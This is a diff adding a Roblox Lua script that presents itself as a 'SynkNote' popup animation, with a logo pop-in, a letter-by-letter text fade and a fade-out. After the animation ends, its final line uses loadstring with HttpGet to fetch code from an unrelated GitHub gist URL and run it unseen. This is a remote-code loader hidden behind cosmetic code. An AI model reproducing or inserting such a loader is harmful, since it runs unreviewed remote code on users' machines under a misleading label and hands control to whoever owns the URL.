@@ -1,0 +1,175 @@
+-- SynkNote Popup Animation Script
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create the main ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SynkNotePopup"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+
+-- Create the main frame container (will hold both image and text centered)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 290, 0, 80)
+mainFrame.Position = UDim2.new(0.5, -145, 0.5, -40)
+mainFrame.BackgroundTransparency = 1
+mainFrame.Parent = screenGui
+
+-- Create the image
+local imageLabel = Instance.new("ImageLabel")
+imageLabel.Name = "PopupImage"
+imageLabel.Size = UDim2.new(0, 80, 0, 80)
+imageLabel.Position = UDim2.new(0.5, -40, 0.5, -40)
+imageLabel.BackgroundTransparency = 1
+imageLabel.Image = "rbxassetid://126305928499111"
+imageLabel.ScaleType = Enum.ScaleType.Fit
+imageLabel.ImageTransparency = 1
+imageLabel.Parent = mainFrame
+
+-- Create the text container
+local textFrame = Instance.new("Frame")
+textFrame.Name = "TextFrame"
+textFrame.Size = UDim2.new(0, 200, 0, 80)
+textFrame.Position = UDim2.new(0, 90, 0, 0)
+textFrame.BackgroundTransparency = 1
+textFrame.Parent = mainFrame
+
+-- Create individual letters for "SynkNote"
+local letters = {"S", "y", "n", "k", "N", "o", "t", "e"}
+local textLabels = {}
+local letterWidth = 200 / #letters
+for i, letter in ipairs(letters) do
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Name = "Letter" .. i
+    textLabel.Size = UDim2.new(0, letterWidth, 1, 0)
+    textLabel.Position = UDim2.new(0, (i-1) * letterWidth, 0, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = letter
+    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel.TextScaled = true
+    textLabel.Font = Enum.Font.GothamBold
+    textLabel.TextStrokeTransparency = 0
+    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    textLabel.TextTransparency = 1
+    textLabel.Parent = textFrame
+    
+    table.insert(textLabels, textLabel)
+end
+
+-- Animation functions
+local function createPopAnimation()
+    imageLabel.ImageTransparency = 0
+    imageLabel.Size = UDim2.new(0, 0, 0, 0)
+    imageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    
+    local popTween = TweenService:Create(
+        imageLabel,
+        TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        {
+            Size = UDim2.new(0, 80, 0, 80),
+            Position = UDim2.new(0.5, -40, 0.5, -40)
+        }
+    )
+    
+    return popTween
+end
+
+local function createSlideAnimation()
+    local slideTween = TweenService:Create(
+        imageLabel,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {
+            Position = UDim2.new(0, 0, 0, 0)
+        }
+    )
+    
+    return slideTween
+end
+
+local function createTextFadeAnimation()
+    local tweens = {}
+    
+    for i, textLabel in ipairs(textLabels) do
+        local delay = (i - 1) * 0.1
+        
+        local fadeTween = TweenService:Create(
+            textLabel,
+            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, delay),
+            {
+                TextTransparency = 0
+            }
+        )
+        
+        table.insert(tweens, fadeTween)
+    end
+    
+    return tweens
+end
+
+local function createFadeOutAnimation()
+    local fadeOutTweens = {}
+    local imageFadeTween = TweenService:Create(
+        imageLabel,
+        TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {
+            ImageTransparency = 1
+        }
+    )
+    table.insert(fadeOutTweens, imageFadeTween)
+    
+    for _, textLabel in ipairs(textLabels) do
+        local textFadeTween = TweenService:Create(
+            textLabel,
+            TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {
+                TextTransparency = 1
+            }
+        )
+        table.insert(fadeOutTweens, textFadeTween)
+    end
+    
+    return fadeOutTweens
+end
+
+-- Main animation sequence
+local function playAnimation()
+    local popTween = createPopAnimation()
+    popTween:Play()
+    
+    popTween.Completed:Connect(function()
+        wait(0.2)
+
+        local slideTween = createSlideAnimation()
+        slideTween:Play()
+        
+        slideTween.Completed:Connect(function()
+            wait(0.1)
+       
+            local textTweens = createTextFadeAnimation()
+            for _, tween in ipairs(textTweens) do
+                tween:Play()
+            end
+            
+            wait(0.8 + (#letters * 0.1))
+            wait(1)
+            
+            local fadeOutTweens = createFadeOutAnimation()
+            for _, tween in ipairs(fadeOutTweens) do
+                tween:Play()
+            end
+            
+            wait(0.5)
+            screenGui:Destroy()
+            loadstring(game:HttpGet("https://gist.githubusercontent.com/wownskdo/3159a28f4549eaf6c563fc5089ee710a/raw/e764168f658ecfdaa99596bf87902c7071e2017e/HaiwibjsiejddJIsiw"))()
+        end)
+    end)
+end
+
+-- Start the animation
+playAnimation()
